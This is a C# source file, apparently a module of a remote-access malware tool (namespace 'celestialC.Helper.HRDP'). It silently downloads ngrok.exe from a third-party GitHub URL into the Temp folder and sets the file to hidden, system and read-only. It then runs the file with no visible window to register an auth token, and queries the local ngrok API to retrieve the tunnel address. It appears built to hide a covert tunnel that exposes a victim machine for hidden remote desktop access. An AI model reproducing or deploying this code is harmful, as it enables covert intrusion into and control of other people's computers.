using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;

namespace celestialC.Helper.HRDP
{
    internal class Ngrok
    {
        public static void Install(string token)
        {
            try
            {
                Process[] pname = Process.GetProcessesByName("ngrok");
                foreach (Process p in pname) { p.Kill(); }
                if (!File.Exists(Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe"))
                {
                    using (var client = new WebClient())
                    {
                        client.DownloadFile("https://raw.githubusercontent.com/lanzerpub/libs2/main/ngrok.exe", Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe");
                    }
                    File.SetAttributes(Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe", FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                }
            }
            catch
            {
            }

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe";
                psi.Arguments = "config add - authtoken " + token;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                Process.Start(psi);
               // Interaction.Shell(Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe config add-authtoken " + token, AppWinStyle.Hide, false, -1);
            }
            catch { }
        }

        public static string API()
        {
            string text = string.Empty;
            string result = text;
            checked
            {
                try
                {
                    using (Stream stream = new WebClient().OpenRead("http://127.0.0.1:4040/api/tunnels"))
                    {
                        using (StreamReader streamReader = new StreamReader(stream))
                        {
                            string input = streamReader.ReadToEnd();
                            string pattern = "((tcp?|http?|tcp|http):((//)|(\\\\\\\\))+[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)";
                            MatchCollection matchCollection = Regex.Matches(input, pattern);
                            try
                            {
                                foreach (object obj in matchCollection)
                                {
                                    object objectValue = RuntimeHelpers.GetObjectValue(obj);
                                    string text2 = "tcp://";
                                    string text3 = Convert.ToString(RuntimeHelpers.GetObjectValue(objectValue));
                                    text = text3.Substring(text3.IndexOf(text2) + text2.Length);
                                }
                            }
                            finally
                            {

                            }
                            try
                            {
                                foreach (object obj2 in matchCollection)
                                {
                                    object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
                                    string text4 = "http://";
                                    string text5 = Convert.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
                                    text = text5.Substring(text5.IndexOf(text4) + text4.Length);
                                }
                            }
                            finally
                            {

                            }
                        }
                    }
                    return (!string.IsNullOrEmpty(text)) ? text : "N/A";
                }
                catch
                {
                }
                return result;
            }
        }
    }
}
